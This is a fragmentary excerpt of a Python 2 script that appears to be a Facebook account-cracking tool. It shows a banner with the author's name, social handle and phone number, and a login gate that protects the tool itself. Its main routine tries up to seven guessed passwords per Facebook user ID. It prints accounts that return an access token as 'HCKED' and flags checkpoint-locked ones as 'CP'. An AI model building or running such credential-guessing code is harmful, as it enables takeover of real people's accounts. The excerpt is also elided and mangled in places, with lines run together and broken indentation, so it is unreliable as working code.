...
\033[1;96m☠️\033[1;97m Tool Author : Nathaniel Hanzo\033[1;97m[ \033[0;92mPrince\033[1;97m]

\033[1;96m☠️\033[1;97m Facebook    : Dennis Sinyangwe

\033[1;96m☠️\033[1;97m Whatsapp    : +260 970 743 628
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
    	...
    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")        if (password == CorrectPassword):
            ...
            print "Logged in successfully🔓 as " + username #Dev:DENNIS-SINYANGWE
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://www.facebook.com/profile.php?id=100054911553742')
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;96m[DENNIS-CP] "+uid+" | "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;96m[DENNIS-HCKED] "+uid+" | "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;96m[DENNIS-CP] "+uid+" | "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;96m[DENNIS-HCKED] "+uid+" | "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;96m[DENNIS-CP] "+uid+" | "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print(" \x1b[1;96m[DENNIS-HCKED] "+uid+" | "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;96m[DENNIS-CP] "+uid+" | "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;96m[DENNIS-HCKED] "+uid+" | "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\033[1;96m[DENNIS-CP] "+uid+" | "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;96m[DENNIS-HCKED] "+uid+" | "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;96m[DENNIS-CP] "+uid+" | "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;96m[DENNIS-HCKED] "+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\033[1;96m[DENNIS-CP] "+uid+" | "+pass7)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;96m[DENNIS-HCKED] "+uid+" | "+pass7+"\x1b[1;0m")
